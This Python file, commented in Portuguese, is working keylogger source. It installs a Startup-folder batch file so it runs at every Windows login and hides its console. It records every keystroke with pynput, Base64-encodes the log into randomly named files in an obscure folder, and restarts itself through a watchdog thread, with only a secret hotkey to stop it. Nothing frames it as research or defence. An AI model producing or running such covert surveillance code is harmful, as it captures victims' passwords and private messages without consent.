import os
import sys
import base64
import random
import time
from datetime import datetime
import threading
from pynput import keyboard

caminho_py = os.path.abspath(__file__)

caminho_bat = r"C:/Users/rpv/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/system-df.bat"

with open(caminho_bat, "w") as arquivo:
    arquivo.write("@echo off\n")
    arquivo.write(f'start "" pythonw.exe "{caminho_py}"\n')
    arquivo.write("exit\n")

HIDDEN_MODE = True
LOG_INTERVAL = 60

ctrl_pressed = False
numpad4_pressed = False

def generate_log_filename():
    prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    return f"{prefix}_log_{timestamp}.txt"

def setup_directories():
    """Configura os diretórios necessários"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    pasta_dir = os.path.join(script_dir, "Int/keyduck/src/assets/Comunicacao")
    
    if not os.path.exists(pasta_dir):
        os.makedirs(pasta_dir, exist_ok=True)
    
    return os.path.join(pasta_dir, generate_log_filename())

log_file_path = setup_directories()
current_word = ""
last_key_time = None
listener = None

def encode_data(data):
    """Codifica dados em Base64"""
    return base64.b64encode(data.encode('utf-8')).decode('utf-8')

def write_word_to_file():
    """Escreve a palavra acumulada no arquivo criptografada"""
    global current_word
    if current_word:
        try:
            with open(log_file_path, "a", encoding='utf-8') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                encoded_data = encode_data(f"{timestamp}: {current_word}")
                f.write(encoded_data + '\n')
                f.flush()
        except Exception:
            pass
        current_word = ""

def write_special_key(key_data):
    """Escreve tecla especial no arquivo criptografada"""
    try:
        with open(log_file_path, "a", encoding='utf-8') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            encoded_data = encode_data(f"{timestamp}: {key_data}")
            f.write(encoded_data + '\n')
            f.flush()
    except Exception:
        pass

def write_header_footer(text):
    """Escreve cabeçalho/rodapé criptografado"""
    try:
        with open(log_file_path, "a", encoding='utf-8') as f:
            encoded_data = encode_data(text)
            f.write(encoded_data + '\n')
            f.flush()
    except Exception:
        pass

def check_exit_hotkey():
    """Verifica se o atalho Ctrl+Numpad4 foi pressionado"""
    global ctrl_pressed, numpad4_pressed
    
    if ctrl_pressed and numpad4_pressed:
        write_special_key('[EXIT_HOTKEY]')
        write_word_to_file()
        write_header_footer(f"=== CAPTURA FINALIZADA VIA CTRL+NUMPAD4: {datetime.now()} ===")
        
        # Para o listener graciosamente
        if listener:
            listener.stop()
        
        # Finaliza o programa
        os._exit(0)

def on_press(key):
    """Handler para teclas pressionadas"""
    global current_word, last_key_time, ctrl_pressed, numpad4_pressed
    
    try:
        current_time = time.time()
        
        # Verifica se passou muito tempo desde a última tecla
        if last_key_time and (current_time - last_key_time) > 2.0:
            write_word_to_file()
        
        last_key_time = current_time
        
        # Controle do atalho Ctrl+Numpad4
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True
            write_special_key('[CTRL]')
            check_exit_hotkey()
            
        elif key == keyboard.Key.num_lock:
            # Ignora num_lock
            pass
            
        elif hasattr(key, 'char') and key.char is not None:
            current_word += key.char
            
        # Teclas especiais
        elif key == keyboard.Key.space:
            write_word_to_file()
            write_special_key('[SPACE]')
            
        elif key == keyboard.Key.enter:
            write_word_to_file()
            write_special_key('[ENTER]')
            
        elif key == keyboard.Key.backspace:
            if current_word:
                current_word = current_word[:-1]
            write_special_key('[BACKSPACE]')
            
        elif key == keyboard.Key.tab:
            write_word_to_file()
            write_special_key('[TAB]')
            
        elif key == keyboard.Key.esc:
            write_word_to_file()
            write_special_key('[ESC]')
            # Não para o listener em modo segundo plano
            
        elif key == keyboard.Key.alt:
            write_special_key('[ALT]')
            
        # Detecção do Numpad4
        elif hasattr(key, 'vk') and key.vk == 100:  # Código virtual do Numpad4
            numpad4_pressed = True
            write_special_key('[NUMPAD4]')
            check_exit_hotkey()
            
        else:
            key_name = f'[{str(key).split(".")[-1].upper()}]'
            write_special_key(key_name)
            
    except Exception:
        pass

def on_release(key):
    """Handler para teclas liberadas"""
    global ctrl_pressed, numpad4_pressed
    
    try:
        # Atualiza estado das teclas do atalho
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = False
            
        elif hasattr(key, 'vk') and key.vk == 100:  # Código virtual do Numpad4
            numpad4_pressed = False
            
    except Exception:
        pass

def hide_console():
    """Esconde o console (Windows)"""
    try:
        if os.name == 'nt':  # Windows
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def keep_alive():
    """Thread para manter o programa vivo e verificar status"""
    while True:
        try:
            # Verifica se o listener ainda está ativo
            if not listener or not listener.running:
                start_keylogger()
            
            # Escreve heartbeat ocasionalmente (opcional)
            if random.randint(1, 100) == 1:  # 1% de chance a cada intervalo
                write_special_key('[HEARTBEAT]')
                
        except Exception:
            pass
        
        time.sleep(LOG_INTERVAL)

def start_keylogger():
    """Inicia o keylogger"""
    global listener
    
    try:
        write_header_footer(f"=== CAPTURA INICIADA: {datetime.now()} ===")
        
        # Agora com ambos on_press e on_release
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.daemon = True  # Permite que o programa feche mesmo com listener ativo
        listener.start()
        
    except Exception:
        pass

def main():
    """Função principal"""
    # Esconde o console se estiver em modo oculto
    if HIDDEN_MODE:
        hide_console()
    
    # Inicia o keylogger
    start_keylogger()
    
    # Inicia thread de monitoramento
    monitor_thread = threading.Thread(target=keep_alive, daemon=True)
    monitor_thread.start()
    
    # Mantém o programa rodando
    try:
        while True:
            time.sleep(10)  # Verificação a cada 10 segundos
    except KeyboardInterrupt:
        # Finalização graciosa se detectar Ctrl+C
        write_word_to_file()
        write_header_footer(f"=== CAPTURA FINALIZADA: {datetime.now()} ===")
        if listener:
            listener.stop()

if __name__ == "__main__":
    main()